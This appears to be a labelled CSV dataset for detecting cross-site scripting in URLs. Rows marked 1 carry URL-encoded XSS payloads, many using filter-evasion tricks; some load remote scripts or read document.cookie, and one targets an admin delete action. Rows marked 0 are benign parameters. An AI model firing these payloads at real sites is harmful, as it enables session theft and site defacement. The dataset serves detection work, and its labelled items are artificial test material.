text,label
/3338?todo=%3C%25%20foo%3E%3Cx%20foo%3D%22%25%3E%3Cscript%3Ealert%28123%29%3C/script%3E%22%3E,1
/Care?D=%3CBR%20SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E,1
/askjeeveslogo?skipped=skipped,0
/fbs?mainGenre=%3E%3Ch1%3E%3CIFRAME%20width%3D%22420%22%20height%3D%22315%22%20frameborder%3D%220%22%20onmouseover%3D%22document.location.href%3D%27https%3A//www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr,1
/002440?ranking=%3CBODY%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/feature1?pop3host=%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29//%22%3E,1
/longhorn?st=st,0
/weather?boardseen=boardseen,0
/freeswan?fc=fc,0
/AVG?dataLabel=dataLabel,0
/cclogo?currentPassword=currentPassword,0
/102891?legendfont=legendfont,0
/M25?sendmethod=%3CBODY%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,1
/savenow?deduction=deduction,0
/5131?mimetype=mimetype,0
/0490?sSearch=%3Ca%20href%3D%22javascript%5Cx3A%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/2588?binddn=%3Ciframe//%20src%3DjavaSCRIPT%26colon%3Balert%281%29,1
/sisw?deleteall=deleteall,0
/prod_serv?verboselog=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC/script%25BE,1
/kultur?addcomment=addcomment,0
/J1?prune=%3C--%60%3Cimg/src%3D%60%20onerror%3Dalert%281%29%3E%20--%21%3E,1
/000204?rssfeed=rssfeed,0
/24273?proxyport=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx81javascript%3Aalert%281%29%3C/script%3E,1
/application-control?obfuscate=%3C%3CSCRIPT%3E%25%28payload%29s//%3C%3C/SCRIPT%3E,1
/3317?restock=/%2Aiframe/src%2A/%3Ciframe/src%3D%22%3Ciframe/src%3D%40%22/onload%3Dprompt%281%29%20/%2Aiframe/src%2A/%3E,1
/icon21?radiusacctport=%22/%3E%3C/a%3E%3C/%3E%3Cimg%20src%3D1.gif%20onerror%3Dalert%281%29%3E,1
/6457?changed=%3Csvg%20contentScriptType%3Dtext/vbs%3E%3Cscript%3EMsgBox%2B1,1
/bug?sandbox=sandbox,0
/ngn?pmnotif=pmnotif,0
/img_thumbnails?descripcion=descripcion,0
/36737?gpsinitcmd=gpsinitcmd,0
/14197?albumname=albumname,0
/New-York?testing=%3CIMG%20SRC%3Dx%20onsearch%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/ep?hex=hex,0
/index_79?smfdbp=%3CHEAD%3E%3CMETA%20HTTP-EQUIV%3D%22CONTENT-TYPE%22%20CONTENT%3D%22text/html%3B%20charset%3DUTF-7%22%3E%20%3C/HEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-/SCRIPT%2BAD4-,1
/ibiblog?ddnsdomain=%3CIMG%20SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E,1
/xfe?NetworkUserID=%3CMETA%20HTTP-EQUIV%3D%22Set-Cookie%22%20Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C/SCRIPT%3E%22%3E,1
/Enlightenment?dbpass=dbpass,0
/index-124?Category=%3C%3BA%20HREF%3D%22%3Bhttp%3A//1113982867/%22%3B%3E%3BXSS%3C%3B/A%3E%3B,1
/5565?subnetv6=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx85expression%28javascript%3Aalert%281%29%22%3EDEF,1
/2003-April?newtext=newtext,0
/_user?AUTH=AUTH,0
/002266?kind=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx85expression%28javascript%3Aalert%281%29%22%3EDEF,1
/18797?basemodule=%3C%3BXML%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/xsstest.xml%22%3B%20ID%3DI%3E%3B%3C%3B/XML%3E%3B,1
/nmap-2?vgrlf=vgrlf,0
/000206?wli=wli,0
/2000-11?oldpassword=%26lt%3BMETA%20HTTP-EQUIV%3D%26quot%3Brefresh%26quot%3B%20CONTENT%3D%26quot%3B0%3Burl%3Ddata%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%26quot%3B%26gt%3B,1
/20861?cartId=cartId,0
/h7?purpose=%3CSCRIPT%20onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C/SCRIPT%3E,1
/oaklandtribune?disablefilter=%3Cscript%20/%2A%2A%2A/%3E/%2A%2A%2A/confirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29/%2A%2A%2A/%3C/script%20/%2A%2A%2A/,1
/122306?master=%5C%22%3Balert%28%27XSS%27%29%3B//,1
/767?disablesegmentationoffloading=disablesegmentationoffloading,0
/7046?itemcount=%3Ca%20href%3D%22javas%5Cx0Bcript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/sept03?pwd=pwd,0
/AntiSpyware?restart=%3Cimg%5Cx32src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/phr2005?showinactive=showinactive,0
/Page-6?frame=frame,0
/fixes?breakpoint=breakpoint,0
/9782?distinct=distinct,0
/gente?logpeer=logpeer,0
/teksty?cuenta=cuenta,0
/2128936?u10=%22%60%27%3E%3Cscript%3E%5Cx20javascript%3Aalert%281%29%3C/script%3E,1
/side2?userpicpersonal=userpicpersonal,0
/airport?notices=notices,0
/242920?additionalData=%26lt%3BHTML%20xmlns%26%2358%3Bxss%26gt%3B%26lt%3B%3Fimport%20namespace%3D%5C%22xss%5C%22%20implementation%3D%5C%22http%26%2358%3B//ha%26%2346%3Bckers%26%2346%3Borg/xss%26%2346%3Bhtc%5C%22%26gt%3B%26lt%3Bxss%26%2358%3Bxss%26gt%3BXSS%26lt%3B/xss%26%2358%3Bxss%26gt%3B%26lt%3B/HTML%26gt%3B,1
/whatson?age=age,0
/CHANGES-current?resetpasskey=resetpasskey,0
/144987?uploadloc=%3CIMG%20SRC%3Dx%20onwheel%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/Geosciences?mtype=mtype,0
/sc_nm?Group=Group,0
/sprite?metakeyinput=%3Cscript%3Ejavascript%3Aalert%281%29%3C%5Cx00/script%3E,1
/2705?proxyhost=proxyhost,0
/printer_icon?directmode=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3B%3C/scr%3C/script%3Eipt%3E,1
/technet?reportsent=reportsent,0
/iconoencuestas?qact=qact,0
/masthead-logo?subnetv6=subnetv6,0
/fips185?versions=%3Cscript%20onLoad%20script%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onLoad%3E,1
/order-tramadol?viewtype=viewtype,0
/WinRAR-v3?height=height,0
/stylexp?step4=step4,0
/spell-gw?catname=catname,0
/nq?cfx=%3C%3BSTYLE%20TYPE%3D%22%3Btext/javascript%22%3B%3E%3Balert%28%27%3BXSS%27%3B%29%3B%3C%3B/STYLE%3E%3B,1
/tiki-survey_stats?shopping=%3Ca%20href%3D%22%5Cx07javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/Leads2Results_24d?setPublic=%3Cscript%3Ealert%28%22XSS%20by%20%5Cnxss%22%29%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20xss%3C/h1%3E%3C/marquee%3E,1
/21213?redirect=%3Cstyle%3E%3C/style%5Cx09%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,1
/latimes?approve=approve,0
/3631?timezonedetection=%26lt%3B%3Fimport%20namespace%3D%5C%22t%5C%22%20implementation%3D%5C%22%23default%23time2%5C%22%26gt%3B,1
/qbullets?expirationmonth=expirationmonth,0
/ACE?nextid=nextid,0
/evergreen?bootslice=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,1
/aq?to=%E2%80%9C%3E%3Cs%E2%80%9D%252b%E2%80%9Dcript%3Ealert%28document.cookie%29%3C/script%3E,1
/iprights?andor=%3Cembed%20code%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C/embed%3E,1
/mindmag?querysql=%27%22%22%3E%3Cscript%20language%3D%22JavaScript%22%3E%20alert%28%27X%20%5CnS%20%5CnS%27%29%3B%3C/script%3E,1
/new-servers?deathdate=%3Cembed%20src%3D%22javascript%3Aalert%281%29%22%3E,1
/nana?inputid=inputid,0
/1369?managerlanguage=managerlanguage,0
/th_flag?response=response,0
/Trailer?star=star,0
/topNavRight?chpage=ABC%3Cdiv%20style%3D%22x%3A%5Cx0Aexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/36260?bg=bg,0
/bj?daemon=daemon,0
/airpower?CV2Result=%3C%3BMETA%20HTTP-EQUIV%3D%22%3Brefresh%22%3B%20CONTENT%3D%22%3B0%3Burl%3Djavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B,1
/5g?crtty=crtty,0
/h2k2?Project=%3Ca%20href%3D%22javas%5Cx04cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/gawk?postRedirect=postRedirect,0
/kathy?iscatchall=%3CA%20HREF%3D%22http%3A//%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C/A%3E,1
/2005_09?notification=%3Cmarquee/onstart%3Dalert%28%29%3E,1
/divider1?banner=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx80javascript%3Aalert%281%29%3C/script%3E,1
/help-desk?href=%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/voip_news?ResourceUploadForm=%26%23x003C%3B,1
/Barcode-Scanners?BIGGER=BIGGER,0
/213?bucket=bucket,0
/deportes?obfuscate=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx0D%3Djavascript%3Aalert%281%29%3E,1
/adblock?filelist=%3Cvideo/poster/onerror%3Dalert%28%29%3E,1
/18791?connectionType=connectionType,0
/login_off?zonetxt=zonetxt,0
/_imgs?htaccess=htaccess,0
/lic?expirationyear=%26lt%3BHTML%20xmlns%3Axss%26gt%3B,1
/6149?additional=additional,0
/pressinf?uname=%26lt%3BSTYLE%26gt%3BBODY%7B-moz-binding%3Aurl%28%26quot%3Bhttp%3A//ha.ckers.org/xssmoz.xml%23xss%26quot%3B%29%7D%26lt%3B/STYLE%26gt%3B,1
/164213?enroll=%3Csvg%3E%3Cscript%3E//%26NewLine%3Bconfirm%281%29%3B%3C/script%20%3C/svg%3E,1
/dor?hasAudio=hasAudio,0
/node11?timeframe=timeframe,0
/desperate?sqlpass=sqlpass,0
/magIssue?utype=utype,0
/pdffiles1?sName=%22%60%27%3E%3Cscript%3E%5CxF0%5Cx90%5Cx96%5Cx9Ajavascript%3Aalert%281%29%3C/script%3E,1
/viewcart?inViewLogs=inViewLogs,0
/cat_art?xajax=%26%23X00003c%3B,1
/zt?emailAddress=%3CIMG%20SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E,1
/penguin?fieldEnc=fieldEnc,0
/Reading?rm=%22%60%27%3E%3Cscript%3E%5Cx0Bjavascript%3Aalert%281%29%3C/script%3E,1
/3649051?tomod=tomod,0
/spamdemicmap_large?viewOption=viewOption,0
/20060629?sound=sound,0
/sbs2-context?id24gid=%3Cstyle%20type%3D%22text/css%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Adocument.vulnerable%3Dtrue%22%29%7D%3C/style%3E,1
/gals?jax=%3CBODY%20ONLOAD%3Djavascript%3Ajavascript%3Aalert%281%29%3E,1
/0300?events=events,0
/Disk-Utilities?Edit=%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C/SCRIPT%3E%3Cimg%20src%3D%22%22%20alt%3D%27,1
/hacker?iso=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B//%3C%3C/SCRIPT%3E,1
/5658?preset=%3Cimg%20src%5Cx00%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/cli?notapache=%3Cdiv%20style%3D%22list-style%3Aurl%28http%3A//foo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,1
/am?spec=%26lt%3BIMG%20SRC%3DJaVaScRiPt%3Aalert%28%26apos%3BXSS%26apos%3B%29%26gt%3B,1
/6195?eventname=%3Cxml%20id%3D%22X%22%3E%3Ca%3E%3Cb%3E%3Cscript%3Edocument.vulnerable%3Dtrue%3B%3C/script%3E%3B%3C/b%3E%3C/a%3E%3C/xml%3E,1
/header_index?strictcn=strictcn,0
/30145?errorswarnings=errorswarnings,0
/immagine?u38=u38,0
/delicious_library?maximumtableentries=%3Cscript%5Cx09type%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/seymour?r=%3CXSS%20STYLE%3D%22behavior%3A%20url%28%25%28htc%29s%29%3B%22%3E,1
/phishclusters?setMetrics=setMetrics,0
/6608?maintenance=maintenance,0
/Farscape?nfid=nfid,0
/15059?mark=mark,0
/2172686?frequency=frequency,0
/152301?special=special,0
/16334?sendmsg=sendmsg,0
/porsche?sqlfile=%3Cobject%20data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E,1
/f-58?groupId=groupId,0
/thumb_6?valor=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx2Fonerror%3Djavascript%3Aalert%281%29%3E,1
/httptype?again=%3Cform%3E%3Cbutton%20formaction%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX,1
/partner_wps?wctx=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx20%3Djavascript%3Aalert%281%29%3E,1
/3831?announce=%3Ciframe/onreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E,1
/8584?mailsub=%26lt%3BSCRIPT%20a%3D%26quot%3B%26gt%3B%26quot%3B%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.js%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/Mobile_Phones?fstype=fstype,0
/pubkey?Article=Article,0
/grub?fw=fw,0
/showuni1?gpsinitcmd=gpsinitcmd,0
/br3?minkills=%3C%21--%5Bif%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%5D%3E%20--%3E,1
/thing?discipline=%3Cembed%20code%3D%22http%3A//businessinfo.co.uk/labs/xss/xss.swf%22%20allowscriptaccess%3Dalways%3E,1
/Abstracts?iplist=iplist,0
/satelliteac?stop=%3Ciframe%20src%3D%22vbscript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/cb_logo?actors=%3Cmarquee%20onStart%20marquee%20onStart%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/marquee%20onStart%3E,1
/cbe?oldEmail=%22/%3E%3Cimg/onerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax%20/%3E,1
/blink?active=%3CIMG%20SRC%3Dx%20onmouseover%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/fisting?replies=replies,0
/sitemap_e?year=year,0
/saugus?topicID=topicID,0
/index348?prepare=%3Cobject%20data%3Ddata%3Atext/html%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C/object%3E,1
/2170242?dateFormat=%3CIMG%20SRC%3Dx%20ondragend%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/APS?quickmanagertv=quickmanagertv,0
/countertops?ragename=ragename,0
/0312-exploits?nb=%3C%3BSCRIPT%20%22%3Ba%3D%27%3B%3E%3B%27%3B%22%3B%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/xss.js%22%3B%3E%3B%3C%3B/SCRIPT%3E%3B,1
/macc?dbtype=dbtype,0
/ms-security?favicon=favicon,0
/jquery?newscan=newscan,0
/29177?errorCode=errorCode,0
/ecrire?icon=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx22onerror%3Djavascript%3Aalert%281%29%3E,1
/marketplace08?noti=noti,0
/21620?rxantenna=rxantenna,0
/73546?cs=%3Cbody%20onFocus%20body%20onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onFocus%3E,1
/1045?vbsq=%3Cform%3E%3Cisindex%20formaction%3D%22javascript%26colon%3Bconfirm%281%29%22,1
/swan?labels=labels,0
/openwfe?pw2=pw2,0
/242814?allfields=allfields,0
/hype?searchadvr=%3CIMG%20SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%3CWBR%3E%27XSS%27%29%3B%22%3E,1
/dynamicdiagrams3?charge=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx0Donerror%3Djavascript%3Aalert%281%29%3E,1
/2875?sandbox=sandbox,0
/iso-images?key2=key2,0
/edwards?titre=%3Cimg%20src%3D%23%20onerror%5Cx3D%22javascript%3Aalert%281%29%22%20%3E,1
/turismo?radiusenable=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx85javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/27944?sqlty=sqlty,0
/saude?doc=%3Cscript%20onLoad%20script%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/script%20onLoad%3E,1
/2170494?newpassword2=%3Ciframe/onreadystatechange%3Dalert%281%29,1
/linuxchick3?ul=%3CLAYER%20SRC%3D%22%25%28scriptlet%29s%22%3E%3C/LAYER%3E,1
/gewinnspiele?addtag=addtag,0
/bitrix?keywords=%3Ciframe/onreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E,1
/smokeping?songid=songid,0
/26301?censorIgnoreCase=%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/seller?stay=stay,0
/siteanalyst_small?sorttype=sorttype,0
/1904811159?modulename=modulename,0
/27323?scene=scene,0
/April?liked=liked,0
/29294?massdefaceurl=%3Cmarquee%20onstart%3D%27javascript%3Aalert%26%23x28%3B1%26%23x29%3B%27%3E%5E__%5E,1
/OpenBSD?thumbnail=thumbnail,0
/5954?maxage=maxage,0
/feature?dragtable=dragtable,0
/phearless?getdyndnsstatus=getdyndnsstatus,0
/o4?UserLoginForm=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx27onerror%3Djavascript%3Aalert%281%29%3E,1
/17461?remdays=%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/TWAcomm_27d?utm_term=utm_term,0
/intelmacsupport?TYPE=%3Csvg%20xmlns%3D%22%23%22%3E%3Cscript%3Ealert%281%29%3C/script%3E%3C/svg%3E,1
/892?preauthurl=preauthurl,0
/sept96?priority=priority,0
/3649681?Example=%3C/%20foo%3D%22%3E%3Cscript%3Ealert%281%29%3C/script%3E%22%3E,1
/photos_public?span=span,0
/Back4WinXP_v3?fieldtype=%3Ca%20href%3D%22%5Cx1Djavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/bestuur?noxml=noxml,0
/Projekte?lid=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx8Aexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/152039?chk=chk,0
/rfid?charge=charge,0
/ice?sqlpass4=%22%3E%3Cscript%20alert%28String.fromCharCode%2888%2C83%2C83%29%29%3C/script%3E,1
/000639?installbind=%3Cimg%20src%3Dx%5Cx11onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/6751?ticketbits=ticketbits,0
/mclogo?mybulletin=%3Ciframe/%2500/%20src%3DjavaSCRIPT%26colon%3Balert%281%29,1
/krishna?Title=%22/%3E%3Cimg/onerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax%20/%3E,1
/windows xp?silver=%3CIMG%20SRC%3Dx%20onpageshow%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/part_time?canpreview=canpreview,0
/174048?regname=%3CSCRIPT/XSS%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/servicesweb?rebroadcast=rebroadcast,0
/imgp1291?misc=%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C/frameset%3E,1
/hid?update=%3Ca%20href%3D%22%5Cx09javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/nouvelles?foo1=%3CIMG%20SRC%3D%22%20%26%2314%3B%20%20javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/9907?flags=%3Chead%3E%3Cbase%20href%3D%22javascript%3A//%22%3E%3C/head%3E%3Cbody%3E%3Ca%20href%3D%22/.%20/%2Cjavascript%3Aalert%281%29//%23%22%3EXXX%3C/a%3E%3C/body%3E,1
/cont_c4?goal=goal,0
/15226?uploadForm=uploadForm,0
/msg00253?addMessage=addMessage,0
/tanner?synconupgrade=synconupgrade,0
/title_left?js=js,0
/9957?typename=typename,0
/radical?RECHECK=%3Cstyle%3EBODY%7B-moz-binding%3Aurl%28%22http%3A//www.securitycompass.com/xssmoz.xml%23xss%22%29%7D%3C/style%3E,1
/24771?currentday=%3Cscript%3E/%2A%20%2A%5Cx00/javascript%3Aalert%281%29//%20%2A/%3C/script%3E,1
/6734?submitrobots=submitrobots,0
/3126?coM=%3Cscript%20%5E__%5E%3Ealert%28String.fromCharCode%2849%29%29%3C/script%20%5E__%5E,1
/Windows2000Security?potentialid=potentialid,0
/vq?imagefile=%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%28%601%60%29%29%3E,1
/fill?modfunc=modfunc,0
/27850?srcnot=%3Ca%20href%3D%22%5Cx09javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/perlfunc?id33level=%26lt%3BA%20HREF%3D%26quot%3Bhttp%3A//ha.ckers.org%40google%26quot%3B%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/53246?tradercap=tradercap,0
/ipgrab?filterAlert=filterAlert,0
/Smiley?qcontent=qcontent,0
/ipaddress?friends=friends,0
/business-intelligence?reverseacct=%3CIMG%20SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E,1
/installers?ruleid=ruleid,0
/LCD?deduction=%3CSTYLE%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%3B%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EXSS,1
/000762?bzipcode=bzipcode,0
/prikbord?previewwrite=previewwrite,0
/301?editUserGroupSubmit=editUserGroupSubmit,0
/002372?notdeleted=notdeleted,0
/s-new?createmode=Redirect%20302%20/a.jpg%20http%3A//victimsite.com/admin.asp%26deleteuser,1
/3389?saveKardexes=%3Cscript%5Cx0Dtype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/121303?series=series,0
/242863?newgroup=newgroup,0
/banads?priority2=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,1
/184459?breadcrumb=%3Cvideo%20src%3D1%20onerror%3Dalert%281%29%3E,1
/97?activationKey=%3Cobject%20onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E,1
/flag-ru?allowopts=allowopts,0
/spsforum?x=x,0
/32263?criteriaRowDelete=%3Cimg%20src%5Cx12%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/4059?nordr=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Ajavascript%3Aalert%281%29%3C/script%3E,1
/trafficking?reportfun=reportfun,0
/kuro5hin?widget=%3Cxml%20onPropertyChange%20xml%20onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/xml%20onPropertyChange%3E,1
/progClean?quizid=quizid,0
/1922?allsignups=http%3A//www.%3Cscript%3Ealert%281%29%3C/script%20.com,1
/lh2?milw0=%3Cscript/src%3D%26%23100%26%2397%26%23116%26%2397%3Atext/%26%23x6a%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x000070%26%23x074%2C%26%23x0061%3B%26%23x06c%3B%26%23x0065%3B%26%23x00000072%3B%26%23x00074%3B%281%29%3E%3C/script%3E,1
/anamorphic_widescreen?IMG=%3Cmath%20href%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3ECLICKME%3C/math%3E%20%20%3Cmath%3E%20%3Cmaction%20actiontype%3D%22statusline%23http%3A//google.com%22%20xlink%3Ahref%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3ECLICKME%3C/maction%3E%20%3C/math%3E,1
/uploaded_files?nmdf=nmdf,0
/3917?gpstype=%26lt%3BLINK%20REL%3D%26quot%3Bstylesheet%26quot%3B%20HREF%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.css%26quot%3B%26gt%3B,1
/p_card?alter=alter,0
/Advice?sabapikeytype=sabapikeytype,0
/ca1?resetheader=resetheader,0
/icon_phone?sts=sts,0
/45282?newControl=%3C/%20foo%3D%22%3E%3Cscript%3Ealert%281%29%3C/script%3E%22%3E,1
/JRProductPage?publicUpload=%26lt%3B,1
/alrokerpsa_0001?retry=retry,0
/39590?recurrence=%22%3E/XaDoS/%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%20src%3D%22http%3A//www.site.com/XSS.js%22%3E%3C/script%3E,1
/t5005?refkod=%26lt%3B%21--%26%2391%3Bif%20gte%20IE%204%26%2393%3B%26gt%3B,1
/markread?recent=recent,0
/formal?fromname=fromname,0
/000983?siteurl=%3Ca%20href%3D%22%5Cx04javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/receiver?catalogid=%3C%3BIMG%20SRC%3Djavascript%3Aalert%28%26%3Bquot%3BXSS%26%3Bquot%3B%29%3E%3B,1
/843?showh=showh,0
/ku?recipientCurrency=%22%60%27%3E%3Cscript%3E%5Cx0Ajavascript%3Aalert%281%29%3C/script%3E,1
/c13?generatekey=generatekey,0
/14376?themename=themename,0
